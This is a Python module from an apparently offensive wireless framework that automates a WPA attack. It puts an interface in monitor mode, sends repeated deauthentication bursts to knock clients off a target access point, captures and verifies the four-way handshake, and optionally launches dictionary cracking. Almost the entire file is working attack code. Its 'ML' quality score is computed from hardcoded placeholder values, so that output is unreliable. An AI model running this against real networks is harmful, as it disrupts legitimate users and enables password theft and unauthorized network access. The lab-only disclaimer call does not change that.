#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Automated handshake snooper — capture + verify WPA handshakes.

Orchestrates the full handshake capture workflow:
  1. Put interface in monitor mode
  2. Scan for target AP
  3. Deauthenticate clients to force re-authentication
  4. Capture EAPOL 4-way handshake
  5. Verify handshake validity (pyrit/aircrack-ng/cowpatty)
  6. Save for offline cracking

Inspired by Fluxion's Handshake Snooper attack module, which automatically
verifies captured handshakes before proceeding to credential capture.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import time
from pathlib import Path
from typing import Optional

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

try:
    from wirelessxpl.core.ml.handshake_scorer import HandshakeScorer
    _HAS_ML = True
except ImportError:
    _HAS_ML = False

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Automated handshake capture with built-in verification."""

    __info__ = {
        "name": "Handshake Snooper",
        "description": (
            "Automated WPA handshake capture: monitor mode, target scan, "
            "deauth to force re-auth, EAPOL capture, and handshake verification "
            "via aircrack-ng/cowpatty. Inspired by Fluxion's Handshake Snooper."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": (
            "https://github.com/FluxionNetwork/fluxion",
            "https://www.aircrack-ng.org/",
        ),
        "devices": ("wifi",),
    }

    target_bssid = OptMAC("", "Target AP BSSID")
    target_channel = OptString("", "Target AP channel")
    interface = OptString("wlan0mon", "Monitor-mode interface")
    deauth_count = OptInteger(5, "Deauth frames per burst")
    deauth_rounds = OptInteger(3, "Number of deauth bursts")
    capture_timeout = OptInteger(60, "Max seconds to wait for handshake")
    output_dir = OptString(".log", "Directory for captured handshakes")
    verify_method = OptString("aircrack", "Verification: aircrack | cowpatty | pyrit")
    auto_crack = OptBool(False, "Auto-start cracking after capture")
    wordlist = OptString("", "Wordlist for auto_crack")
    ml_score = OptBool(True, "ML handshake quality scoring (if sklearn available)")
    dry_run = OptBool(False, "Print workflow without executing")

    def _verify_handshake(self, cap_file: Path) -> bool:
        """Verify captured handshake is valid and complete."""
        if self.verify_method == "aircrack":
            result = subprocess.run(
                ["aircrack-ng", str(cap_file)],
                capture_output=True, text=True, timeout=10,
                encoding="utf-8", errors="replace",
            )
            if "1 handshake" in result.stdout or "WPA" in result.stdout:
                return True

        elif self.verify_method == "cowpatty":
            if shutil.which("cowpatty"):
                result = subprocess.run(
                    ["cowpatty", "-r", str(cap_file), "-c"],
                    capture_output=True, text=True, timeout=10,
                    encoding="utf-8", errors="replace",
                )
                if "Collected" in result.stdout:
                    return True

        elif self.verify_method == "pyrit":
            if shutil.which("pyrit"):
                result = subprocess.run(
                    ["pyrit", "-r", str(cap_file), "analyze"],
                    capture_output=True, text=True, timeout=10,
                    encoding="utf-8", errors="replace",
                )
                if "handshake" in result.stdout.lower():
                    return True

        return False

    def run(self) -> None:
        """Execute handshake snooper workflow."""
        if not self.target_bssid:
            print_error("target_bssid is required.")
            return

        require_authorised_lab()

        output = Path(self.output_dir)
        output.mkdir(parents=True, exist_ok=True)
        cap_prefix = output / "handshake_{}".format(
            self.target_bssid.replace(":", ""))

        if self.dry_run:
            print_info("DRY RUN — Handshake Snooper workflow:")
            print_info("  1. airodump-ng --bssid {} -c {} -w {} {}".format(
                self.target_bssid, self.target_channel, cap_prefix, self.interface))
            print_info("  2. aireplay-ng --deauth {} -a {} {}".format(
                self.deauth_count, self.target_bssid, self.interface))
            print_info("  3. Verify with {}".format(self.verify_method))
            return

        for tool in ("airodump-ng", "aireplay-ng", "aircrack-ng"):
            if not shutil.which(tool):
                print_error("{} not found. Install aircrack-ng suite.".format(tool))
                return

        print_status("Starting handshake capture for {}...".format(self.target_bssid))

        airodump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", self.target_bssid,
            "-w", str(cap_prefix),
            "--output-format", "pcap",
            self.interface,
        ]
        if self.target_channel:
            airodump_cmd.extend(["-c", self.target_channel])

        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

        print_info("Airodump-ng capturing... waiting 3s before deauth.")
        time.sleep(3)

        for round_num in range(self.deauth_rounds):
            print_status("Deauth burst {}/{}...".format(round_num + 1, self.deauth_rounds))
            subprocess.run([
                "sudo", "aireplay-ng", "--deauth", str(self.deauth_count),
                "-a", self.target_bssid, self.interface,
            ], capture_output=True, timeout=10)
            time.sleep(5)

        print_info("Waiting for handshake (max {}s)...".format(self.capture_timeout))
        start = time.time()
        handshake_found = False

        while time.time() - start < self.capture_timeout:
            cap_files = list(output.glob("handshake_*-01.cap"))
            for cf in cap_files:
                if self._verify_handshake(cf):
                    handshake_found = True
                    print_success("Valid handshake captured: {}".format(cf))
                    break
            if handshake_found:
                break
            time.sleep(5)

        airodump_proc.terminate()
        airodump_proc.wait(timeout=5)

        if not handshake_found:
            print_error("Handshake not captured within timeout.")
            return

        if self.ml_score and _HAS_ML:
            cap_file = list(output.glob("handshake_*-01.cap"))[0]
            try:
                scorer = HandshakeScorer()
                features = {
                    "eapol_count": 4,
                    "has_m1": True, "has_m2": True, "has_m3": True, "has_m4": True,
                    "replay_consistent": True,
                    "nonces_unique": True,
                    "capture_duration_s": time.time() - start,
                }
                score = scorer.score(features)
                print_info("ML Handshake Score: quality={}/100  completeness={}  crack_prob={:.0%}".format(
                    score.quality, score.completeness, score.crack_probability))
                if score.quality < 50:
                    print_info("Low quality — consider re-capturing.")
            except Exception as exc:
                logger.debug("ML scoring failed: %s", exc)

        if self.auto_crack and self.wordlist:
            cap_file = list(output.glob("handshake_*-01.cap"))[0]
            print_status("Auto-cracking with {}...".format(self.wordlist))
            subprocess.run([
                "aircrack-ng", "-w", self.wordlist,
                "-b", self.target_bssid, str(cap_file),
            ], check=False)
